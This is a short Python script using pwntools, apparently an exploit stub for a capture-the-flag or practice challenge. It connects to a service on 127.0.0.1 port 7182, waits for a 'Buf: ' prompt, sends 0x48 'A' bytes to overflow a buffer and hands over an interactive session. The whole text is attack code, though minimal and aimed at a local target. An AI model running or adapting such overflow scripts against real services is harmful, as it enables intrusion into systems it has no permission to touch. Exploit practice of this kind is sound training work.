from pwn import *

p = remote('127.0.0.1', 7182)

p.recvuntil(b"Buf: ")
p.send(b"A"*0x48)

p.interactive()